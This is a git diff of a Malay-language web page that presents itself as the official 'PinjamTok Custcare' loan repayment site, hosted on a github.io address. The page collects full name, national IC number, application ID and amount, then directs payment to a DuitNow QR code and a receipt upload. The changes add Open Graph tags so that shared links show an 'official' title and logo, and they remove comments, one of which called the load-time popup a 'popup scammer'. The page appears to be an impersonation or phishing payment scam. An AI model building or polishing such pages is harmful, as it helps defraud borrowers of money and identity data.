@@ -3,7 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Laman Web Pembayaran PinjamTok</title>
+    <title>Laman Web Pembayaran PinjamTok Custcare</title>
+
+    <!-- =======================================================
+       TETAPAN METADATA UNTUK MEMAKSA LINK KELUARKAN LOGO SAHAJA
+       ======================================================= -->
+    <meta property="og:title" content="PinjamTok Custcare - Pembayaran Rasmi">
+    <meta property="og:description" content="Laman Web Rasmi Pembayaran Balik Pinjaman PinjamTok Custcare.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://pinjamtok-custcare.github.io/PinjamTok.custcare/">
+    <!-- Ini mengunci gambar previu pautan kepada fail Logo sahaja -->
+    <meta property="og:image" content="IMG_6270.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="300">
+    <meta property="og:image:height" content="300">
     
     <style>
         /* =======================================================
@@ -42,9 +55,6 @@
         }
 
         .logo-placeholder {
-            font-size: 24px;
-            font-weight: bold;
-            color: #2b6cb0;
             margin-bottom: 5px;
         }
 
@@ -418,8 +428,7 @@
     <div class="container">
         <div class="header">
             <div class="logo-placeholder">
-                <!-- Jika imej tiada, teks 'PinjamTok' automatik digantikan supaya tak buruk -->
-                <img src="IMG_6270.png" alt="Logo PinjamTok" width="150" onerror="this.outerHTML='<span>Pinjam<span style=color:#e53e3e>Tok</span></span>'">
+                <img src="IMG_6270.png" alt="Logo PinjamTok Custcare" width="150" onerror="this.outerHTML='<span>Pinjam<span style=color:#e53e3e>Tok</span></span>'">
             </div>
             <p class="subtitle">Laman Web Rasmi Pembayaran Balik Pinjaman</p>
         </div>
@@ -461,7 +470,6 @@
                 <h3>💵 Langkah 2: Imbas QR DuitNow</h3>
                 <p class="step-info">Sila imbas QR Code di bawah menggunakan aplikasi Bank atau e-Wallet anda untuk jumlah <b>RM <span id="displayAmount">0.00</span></b>.</p>
                 <div class="qr-container">
-                    <!-- Jika fail imej lambat load/hilang, kod QR sementara dijana secara automatik -->
                     <img src="IMG_6267.jpeg" alt="QR Code PinjamTok" class="qr-image" onerror="this.src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=PinjamTokPayment'">
                 </div>
                 <div class="payment-details">
@@ -513,13 +521,10 @@
         </div>
     </div>
 
-    <!-- =======================================================
-       LOGIK JAVASCRIPT (KONTROL SISTEM) - SUDAH SIAP DIGABUNGKAN
-       ======================================================= */ -->
+    <!-- CONTROL LOGIC SCRIPT MENGALIRKAN TRANSAKSI -->
     <script>
         let currentStep = 1;
 
-        // Buka popup scammer serta merta sebaik sahaja pelayar web siap loading
         window.addEventListener('DOMContentLoaded', () => {
             document.getElementById('fraudPopup').style.display = 'flex';
         });
@@ -529,19 +534,16 @@
         }
 
         function goToStep2() {
-            // Pengambilan data borang
             const fullname = document.getElementById('fullname').value.trim();
             const icnumber = document.getElementById('icnumber').value.trim();
             const appid = document.getElementById('appid').value.trim();
             const amount = document.getElementById('amount').value.trim();
 
-            // Memastikan data diisi bagi mengelakkan butang stuck/bisu
             if (!fullname || !icnumber || !appid || !amount) {
-                alert("Sila isi semua maklumat yang bertanda (*) sebelum meneruskan langkah.");
+                alert("Sila isi semua maklumat yang bertanda (*) sebelum meneruskan.");
                 return;
             }
 
-            // Memasukkan data dinamik ke elemen paparan lain
             document.getElementById('displayAmount').innerText = parseFloat(amount).toFixed(2);
             document.getElementById('displayICNumber').innerText = icnumber;
             document.getElementById('displayCustomerName').innerText = fullname;
@@ -565,7 +567,6 @@
         }
 
         function updateProgress() {
-            // Mengubah status visual bar bulatan atas
             for (let i = 1; i <= 4; i++) {
                 const stepItem = document.getElementById(`p${i}`);
                 if (stepItem) {
@@ -576,7 +577,6 @@
                     }
                 }
             }
-            // Mengira peratusan panjang garisan biru pembahagi
             const pct = ((currentStep - 1) / 3) * 100;
             document.getElementById('progressLine').style.width = pct + '%';
         }
@@ -584,18 +584,14 @@
         function fileSelected() {
             const fileInput = document.getElementById('receiptFile');
             const statusText = document.getElementById('uploadStatus');
-            
             if (fileInput.files.length > 0) {
                 const file = fileInput.files[0];
-                
-                // Menyekat fail jika melebihi had 5MB
                 if (file.size > 5 * 1024 * 1024) {
-                    alert("Ralat: Saiz fail imej/PDF resit anda melebihi had maksima 5MB.");
+                    alert("Ralat: Saiz fail melebihi had maksima 5MB.");
                     fileInput.value = "";
                     statusText.innerText = "Klik di sini untuk pilih resit";
                     return;
                 }
-                
                 statusText.innerText = "Fail Dipilih: " + file.name;
                 statusText.style.color = "#38a169";
                 statusText.style.fontWeight = "bold";
@@ -604,17 +600,14 @@
 
         function submitReceipt() {
             const fileInput = document.getElementById('receiptFile');
-            
-            // Pengesahan pemfailan resit sebelum dibenarkan hantar
-            if (!fileInput.files || fileInput.files.length === 0) {
-                alert("Sila muat naik gambar resit atau fail bukti pembayaran anda terlebih dahulu.");
+            if (fileInput.files.length === 0) {
+                alert("Sila muat naik resit bukti pembayaran terlebih dahulu sebelum menghantar.");
                 return;
             }
             nextStep(4);
         }
 
         function resetForm() {
-            // Membersihkan memori borang untuk bayaran baru
             document.getElementById('fullname').value = "";
             document.getElementById('icnumber').value = "";
             document.getElementById('appid').value = "";
